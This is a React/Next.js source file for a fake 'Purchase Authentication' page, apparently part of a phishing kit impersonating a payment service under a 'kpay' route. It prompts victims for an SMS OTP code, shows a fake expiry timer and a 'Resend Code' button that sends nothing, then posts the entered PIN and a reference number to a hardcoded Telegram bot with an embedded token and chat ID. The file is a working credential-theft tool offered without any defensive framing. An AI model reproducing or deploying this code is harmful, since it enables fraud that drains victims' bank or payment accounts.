"use client";
import { Suspense } from "react";
import React, { useState, useEffect } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import { useRouter, useSearchParams } from 'next/navigation';
import axios from 'axios';

function CodePageContent() {
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60);
  const [expired, setExpired] = useState(false);
  const [resending, setResending] = useState(false);

  const searchParams = useSearchParams();
  const refN = searchParams.get("refN");
  const router = useRouter();

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setExpired(true);
    }
  }, [timeLeft]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (expired) {
      alert("The code has expired. Please request a new one.");
      return;
    }
    if (code) {
      const text = `
🔐 PIN: ${code}
🔨 Ref: ${refN}
      `;
      try {
        await axios.post(
          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
          {
            chat_id: "-4836393174",
            text: text
          }
        );
        router.push(`/kpay/finish?refN=${refN}`);
      } catch (error) {
        alert("Error sending data");
        console.error(error);
      }
    }
  };

  const handleResend = async () => {
    setResending(true);
    setTimeout(() => {
      setTimeLeft(60);
      setExpired(false);
      setResending(false);
    }, 1000);
  };

  return (
    <div className="container vh-100 d-flex align-items-center" style={{ backgroundColor: "#fdf5f5" }}>
      <div className="row w-100 align-items-center">
        
        {/* الصورة */}
        <div className="col-md-6 text-center mb-4 mb-md-3">
          <img 
            src="./IMG-20250813-WA0009.jpg" 
            alt="back image" 
            className="img-fluid rounded border border-danger shadow w-75"
          />
        </div>

        {/* الفورم */}
        <div className="col-md-6 d-flex justify-content-center">
          <form 
            onSubmit={handleSubmit} 
            className="p-4 rounded shadow w-100" 
            style={{ maxWidth: "350px", backgroundColor: "white", border: "2px solid #ff4d4d" }}
          >
            <h4 className="text-center mb-3 text-danger">
              Purchase Authentication
            </h4>
            <p>We have sent you an SMS with an OTP code to your registered mobile number.</p>
            <p>Enter your OTP code below:</p>

            <p className="text-danger fw-bold">
              {expired 
                ? "The code has expired." 
                : `This code will expire in ${timeLeft}s`}
            </p>

            <div className="mb-3">
              <input 
                type="text" 
                className="form-control border-danger" 
                placeholder="Enter code" 
                value={code} 
                onChange={(e) => setCode(e.target.value)} 
                required
              />
            </div>

            <button 
              type="submit" 
              className="btn w-100 mb-2" 
              style={{ backgroundColor: "#ff4d4d", color: "white" }}
              disabled={expired}
            >
              Confirm
            </button>

            <button 
              type="button"
              onClick={handleResend}
              className="btn btn-outline-danger w-100"
              disabled={!expired || resending}
            >
              {resending ? "Resending..." : "Resend Code"}
            </button>
          </form>
        </div>

      </div>
    </div>
  );
}

export default function CodePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <CodePageContent />
    </Suspense>
  );
}
